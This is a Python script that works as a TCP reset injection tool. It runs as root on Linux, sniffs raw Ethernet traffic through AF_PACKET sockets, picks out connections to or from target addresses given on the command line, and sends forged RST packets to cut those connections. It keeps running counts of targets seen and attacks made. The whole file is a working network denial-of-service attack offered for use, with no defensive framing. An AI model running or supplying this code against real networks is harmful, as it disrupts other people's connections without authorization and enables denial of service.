import threading
import socket
from packet import EthernetFrame
from os import getuid
from time import time, sleep
from sys import exit, argv, platform

if not platform.startswith("linux"):
    print("This script uses AF_PACKET sockets, which only work on Linux.")
    exit(1)

if getuid() != 0:
    print("This script must be run as root so it can capture traffic.")
    exit(1)

if len(argv) < 3:
    print("Usage: {} <iface> <addresses> ...".format(argv[0]))
    exit(1)

# listen on iface, only attack addresses in addresses
iface, *addresses = argv[1:]

attack_event = threading.Event()
attack_targets = []
attack_targets_lock = threading.Lock()

stats = {"attacks": 0, "seen": []}
stats_lock = threading.Lock()


def listen():
    listen_socket = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.ntohs(0x0003)
    )

    print("Watching for connections to interrupt. Press Ctrl-C to stop.")

    while True:
        try:
            frame = EthernetFrame(listen_socket.recv(65535))
        except ValueError:
            continue

        ip = frame.payload
        tcp = ip.payload

        # ignore RST and FIN packets
        if tcp.RST or tcp.FIN:
            continue

        sender = str(ip.source_address)
        receiver = str(ip.dest_address)

        # combined blacklist check and stats
        with stats_lock:
            if sender in addresses:
                if sender not in stats["seen"]:
                    stats["seen"].append(sender)
            elif receiver in addresses:
                if receiver not in stats["seen"]:
                    stats["seen"].append(receiver)
            else:
                continue

        with attack_targets_lock:
            attack_targets.append(frame)
        attack_event.set()

    listen_socket.close()


def attack():
    attack_socket = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.ntohs(0x0003)
    )

    attack_socket.bind((iface, 0))

    while True:
        attack_event.wait()

        while attack_targets:
            with attack_targets_lock:
                target = attack_targets.pop(0)

            print("Attacking {} and {}.".format(
                target.payload.source_address,
                target.payload.dest_address
            ))

            target.payload.payload.forge_reset()
            attack_socket.send(target.raw())

            with stats_lock:
                stats["attacks"] += 1

        attack_event.clear()

    attack_socket.close()


listen_thread = threading.Thread(target=listen, name="listen", daemon=True)
listen_thread.start()
attack_thread = threading.Thread(target=attack, name="attack", daemon=True)
attack_thread.start()

try:
    while True:
        sleep(30)
        with stats_lock:
            print("Seen {}/{} targets. {} attacks.".format(
                len(stats["seen"]),
                len(addresses),
                stats["attacks"]
            ))
except KeyboardInterrupt:
    pass